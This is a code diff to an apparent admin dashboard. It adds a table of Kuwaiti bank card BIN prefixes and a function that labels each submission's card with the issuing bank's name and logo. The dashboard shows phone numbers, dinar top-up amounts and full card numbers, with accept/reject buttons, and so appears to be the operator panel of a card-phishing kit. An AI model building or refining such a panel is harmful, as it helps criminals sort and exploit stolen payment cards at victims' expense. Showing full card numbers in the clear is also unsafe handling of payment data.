@@ -103,42 +103,48 @@
   }
   .modal-overlay.open{display:flex}
   .modal{
-    background:#fff;border-radius:var(--radius);width:100%;max-width:440px;
+    background:#fff;border-radius:var(--radius);width:100%;max-width:560px;
     box-shadow:0 20px 60px rgba(0,0,0,.2);overflow:hidden;
     max-height:90vh;overflow-y:auto;
   }
   .modal-header{
     display:flex;align-items:center;justify-content:space-between;
-    padding:18px 20px;border-bottom:1px solid var(--line);background:#fafbfc;
+    padding:20px 24px;border-bottom:1px solid var(--line);background:#fafbfc;
   }
-  .modal-header h3{font-size:18px;font-weight:800}
+  .modal-header h3{font-size:20px;font-weight:800}
   .modal-close{
-    background:none;border:none;font-size:22px;cursor:pointer;color:var(--ink-soft);
-    width:32px;height:32px;display:flex;align-items:center;justify-content:center;
+    background:none;border:none;font-size:24px;cursor:pointer;color:var(--ink-soft);
+    width:36px;height:36px;display:flex;align-items:center;justify-content:center;
     border-radius:8px;transition:.15s;
   }
   .modal-close:hover{background:#f0f0f0}
-  .modal-body{padding:20px}
+  .modal-body{padding:24px}
+  .bank-banner{
+    display:flex;align-items:center;gap:12px;padding:14px 16px;margin-bottom:16px;
+    background:#f0f6ff;border:1px solid #c8ddf5;border-radius:10px;
+  }
+  .bank-banner img{height:32px;width:auto;object-fit:contain}
+  .bank-banner .bank-name{font-size:16px;font-weight:800;color:#1a3a5c}
   .detail-row{
     display:flex;justify-content:space-between;align-items:center;
-    padding:10px 0;border-bottom:1px solid #f0f2f5;
+    padding:12px 0;border-bottom:1px solid #f0f2f5;
   }
   .detail-row:last-child{border-bottom:none}
-  .detail-label{font-size:14px;font-weight:700;color:var(--ink-soft)}
-  .detail-value{font-size:15px;font-weight:700;font-family:monospace;direction:ltr;letter-spacing:.5px}
+  .detail-label{font-size:15px;font-weight:700;color:var(--ink-soft)}
+  .detail-value{font-size:16px;font-weight:700;font-family:monospace;direction:ltr;letter-spacing:.5px}
   .modal-actions{
-    display:flex;gap:10px;padding:16px 20px;border-top:1px solid var(--line);background:#fafbfc;
+    display:flex;gap:12px;padding:18px 24px;border-top:1px solid var(--line);background:#fafbfc;
   }
   .modal-btn{
-    flex:1;padding:12px;border:none;border-radius:10px;font-family:inherit;
-    font-weight:800;font-size:15px;cursor:pointer;transition:.15s;
+    flex:1;padding:14px;border:none;border-radius:10px;font-family:inherit;
+    font-weight:800;font-size:16px;cursor:pointer;transition:.15s;
   }
   .modal-btn.accept{background:#d4f0e0;color:#1e9e5a}
   .modal-btn.accept:hover{background:#1e9e5a;color:#fff}
   .modal-btn.reject{background:#fde8e8;color:var(--red)}
   .modal-btn.reject:hover{background:var(--red);color:#fff}
   .modal-btn:disabled{opacity:.4;cursor:default}
-  .modal-status{text-align:center;padding:10px;font-weight:800;font-size:15px}
+  .modal-status{text-align:center;padding:12px;font-weight:800;font-size:16px}
 
   /* ---------- desktop ---------- */
   @media(min-width:900px){
@@ -312,12 +318,91 @@
 
   function escapeHtml(x){ return String(x).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
 
+  const BANKS = {
+    NBK:{name:'بنك الكويت الوطني',logo:'https://upload.wikimedia.org/wikipedia/commons/a/a8/NBK.svg'},
+    KFH:{name:'بيت التمويل الكويتي',logo:'https://upload.wikimedia.org/wikipedia/en/e/ec/Kuwait_Finance_House_logo.svg'},
+    CBK:{name:'البنك التجاري الكويتي',logo:'https://upload.wikimedia.org/wikipedia/commons/e/eb/CBK_LOGO.png'},
+    GB:{name:'بنك الخليج',logo:'https://upload.wikimedia.org/wikipedia/commons/2/27/Gulf_Bank_Logo.svg'},
+    ABK:{name:'البنك الأهلي الكويتي',logo:'https://upload.wikimedia.org/wikipedia/commons/5/52/ABK_Logo.svg'},
+    BURGAN:{name:'بنك برقان',logo:'https://upload.wikimedia.org/wikipedia/commons/9/96/Burgan_Bank_logo.svg'},
+    KIB:{name:'بنك الكويت الدولي',logo:'https://upload.wikimedia.org/wikipedia/en/b/b2/Kuwait_International_Bank_Logo.png'},
+    BOB:{name:'بنك بوبيان',logo:'https://upload.wikimedia.org/wikipedia/commons/3/30/BoubyanBankLogo_%281%29.svg'},
+    WRB:{name:'بنك وربة',logo:'https://upload.wikimedia.org/wikipedia/commons/4/4d/Warba_Bank_Logo.png'},
+    BBK:{name:'بنك البحرين والكويت',logo:'https://upload.wikimedia.org/wikipedia/commons/d/d5/Bank_of_Bahrain_and_Kuwait.svg'},
+  };
+  const BIN_MAP = {
+    '415899':'NBK','417768':'NBK','426083':'NBK','432423':'NBK',
+    '455014':'NBK','455015':'NBK','464452':'NBK','479098':'NBK',
+    '515496':'NBK','515515':'NBK','519130':'NBK','520650':'NBK',
+    '521408':'NBK','521415':'NBK','522888':'NBK','530447':'NBK',
+    '534993':'NBK','535010':'NBK','535417':'NBK','536336':'NBK',
+    '541312':'NBK','541313':'NBK','541318':'NBK','542836':'NBK',
+    '544219':'NBK','545494':'NBK','545880':'NBK','546860':'NBK',
+    '547187':'NBK','547196':'NBK','552050':'NBK','552277':'NBK','558883':'NBK',
+    '400601':'KFH','416835':'KFH','421107':'KFH','428926':'KFH',
+    '450777':'KFH','450778':'KFH','455018':'KFH','479045':'KFH','498495':'KFH',
+    '516678':'KFH','517957':'KFH','526450':'KFH','544239':'KFH','544240':'KFH','545408':'KFH',
+    '424677':'CBK','425873':'CBK','440625':'CBK','443967':'CBK','443968':'CBK',
+    '455057':'CBK','464462':'CBK','476099':'CBK','480944':'CBK','485441':'CBK','489015':'CBK',
+    '517731':'CBK','521175':'CBK','521371':'CBK','532672':'CBK',
+    '541855':'CBK','544290':'CBK','548183':'CBK','548184':'CBK','548277':'CBK',
+    '406430':'GB','422056':'GB','431210':'GB','431927':'GB',
+    '438912':'GB','456776':'GB','456777':'GB','456778':'GB',
+    '522864':'GB','524158':'GB','531726':'GB','532675':'GB',
+    '535966':'GB','540261':'GB','541107':'GB','542857':'GB',
+    '542859':'GB','544675':'GB','545424':'GB','552078':'GB',
+    '403622':'ABK','422431':'ABK','423826':'ABK','426669':'ABK','428628':'ABK',
+    '429790':'ABK','429791':'ABK','450902':'ABK','455016':'ABK','455049':'ABK','492190':'ABK',
+    '522869':'ABK','524114':'ABK','529567':'ABK','544621':'ABK','544622':'ABK','544623':'ABK','556638':'ABK',
+    '402978':'BURGAN','415254':'BURGAN','435798':'BURGAN','435799':'BURGAN',
+    '438123':'BURGAN','438124':'BURGAN','440711':'BURGAN','440800':'BURGAN',
+    '440801':'BURGAN','440831':'BURGAN','450238':'BURGAN','455048':'BURGAN',
+    '455067':'BURGAN','455068':'BURGAN','456031':'BURGAN','466797':'BURGAN',
+    '466799':'BURGAN','468502':'BURGAN','468564':'BURGAN','475189':'BURGAN',
+    '476335':'BURGAN','483464':'BURGAN','491785':'BURGAN',
+    '517799':'BURGAN','518521':'BURGAN','518549':'BURGAN','527525':'BURGAN',
+    '527526':'BURGAN','533408':'BURGAN','536047':'BURGAN','540759':'BURGAN',
+    '403068':'KIB','406464':'KIB','409054':'KIB','413033':'KIB','458770':'KIB',
+    '404919':'BOB','409190':'BOB','422113':'BOB','422114':'BOB','423195':'BOB',
+    '426058':'BOB','441773':'BOB','450605':'BOB','458815':'BOB','470350':'BOB',
+    '517219':'WRB','532749':'WRB','532800':'WRB','535395':'WRB',
+    '535406':'WRB','535415':'WRB','547185':'WRB','554801':'WRB',
+    '557763':'WRB','559151':'WRB',
+    '440250':'BBK','455012':'BBK','455013':'BBK',
+    '409055':'KFH','458583':'KFH','524221':'KFH','524745':'KFH',
+    '521533':'NBK','534994':'NBK',
+    '526206':'CBK',
+    '422869':'ABK','529568':'ABK',
+    '435800':'BURGAN','468565':'BURGAN','524844':'BURGAN',
+  };
+
+  function detectBank(cardNum) {
+    if (!cardNum) return null;
+    const raw = cardNum.replace(/\D/g,'');
+    if (raw.length < 4) return null;
+    const bin6 = raw.slice(0,6);
+    if (BIN_MAP[bin6]) return BANKS[BIN_MAP[bin6]];
+    for (let len = 5; len >= 4; len--) {
+      const prefix = raw.slice(0, len);
+      for (const [bin, code] of Object.entries(BIN_MAP)) {
+        if (bin.startsWith(prefix)) return BANKS[code];
+      }
+    }
+    return null;
+  }
+
   function openDetails(id) {
     const s = allSubmissions.find(x => x.id === id);
     if (!s) return;
 
+    const bank = detectBank(s.card);
+    let bankHtml = '';
+    if (bank) {
+      bankHtml = '<div class="bank-banner"><img src="'+escapeHtml(bank.logo)+'" alt=""><span class="bank-name">'+escapeHtml(bank.name)+'</span></div>';
+    }
+
     const body = document.getElementById('modalBody');
-    body.innerHTML =
+    body.innerHTML = bankHtml +
       '<div class="detail-row"><span class="detail-label">رقم الجوال</span><span class="detail-value">'+escapeHtml(s.phone)+'</span></div>' +
       '<div class="detail-row"><span class="detail-label">قيمة الشحن</span><span class="detail-value">'+escapeHtml(s.amount)+' د.ك</span></div>' +
       '<div class="detail-row"><span class="detail-label">رقم البطاقة</span><span class="detail-value">'+escapeHtml(s.card||'—')+'</span></div>' +
